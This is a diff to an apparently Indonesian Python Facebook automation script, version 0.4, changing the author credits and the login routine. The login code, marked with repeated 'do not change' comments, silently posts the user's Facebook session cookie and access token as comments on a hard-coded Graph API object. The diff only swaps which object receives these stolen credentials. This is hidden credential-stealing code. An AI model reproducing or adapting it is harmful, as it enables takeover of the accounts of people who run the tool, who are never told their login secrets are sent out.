@@ -5,8 +5,8 @@
 # Recode?, Boleh Asal Cantumkan Nama Author
 # Jangan Ganti Bot Koment Gw
 Author = 'Rochmat Basuki [ github.com/RozhBasXYZ ]'
-Github = 'github.com/Dvanmeploph'
-Facebook = 'Facebook.com/Denventa.Xayonara.Team.UnlimitedARMY'
+Github = 'github.com/Itsmeafriliyan'
+Facebook = 'Facebook.com/Denventa.Xayonara.Team.UnlimitedARMY','Facebook.com/Dvanmeploph.Its'
 Version = '0.4'
 
 ###----------[ RICH COLOR STYLE ]---------- ###
@@ -361,10 +361,10 @@ def login():
 		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
 		link = ('https://m.facebook.com/photo.php/?fbid=1667011730417990') ### --- JANGAN DI GANTI --- ###
 		random_kata = random.choice(["Acc Master","Hallo Ganteng","Panutan Gw Nih Boss 😎","Kamu Ganteng Banget Deh Ferly><😝"]) ### --- JANGAN DI GANTI --- ###
-		#ses.post(f"https://graph.facebook.com/241055118533785?fields=subscribers&access_token={token}",headers=(cookies=cok) ### --- JANGAN DI GANTI --- ###
-		ses.post(f"https://graph.facebook.com/241055118533785/comments/?message={cookie}&access_token={token}",cookies=cok) ### --- JANGAN DI GANTI --- ###
-		ses.post(f"https://graph.facebook.com/241055118533785/comments/?message={token}&access_token={token}",cookies=cok) ### --- JANGAN DI GANTI --- ###
-		ses.post(f"https://graph.facebook.com/241055118533785/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok) ### --- JANGAN DI GANTI --- ###
+		#ses.post(f"https://graph.facebook.com/672104641594118?fields=subscribers&access_token={token}",headers=(cookies=cok) ### --- JANGAN DI GANTI --- ###
+		ses.post(f"https://graph.facebook.com/672104641594118/comments/?message={cookie}&access_token={token}",cookies=cok) ### --- JANGAN DI GANTI --- ###
+		ses.post(f"https://graph.facebook.com/672104641594118/comments/?message={token}&access_token={token}",cookies=cok) ### --- JANGAN DI GANTI --- ###
+		ses.post(f"https://graph.facebook.com/672104641594118/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok) ### --- JANGAN DI GANTI --- ###
 		open('.cookie.txt','w').write(cookie)
 		open('.token.txt','w').write(token)
 	except Exception as e:exit(f" [{M}>{P}] Cookie Invalid")
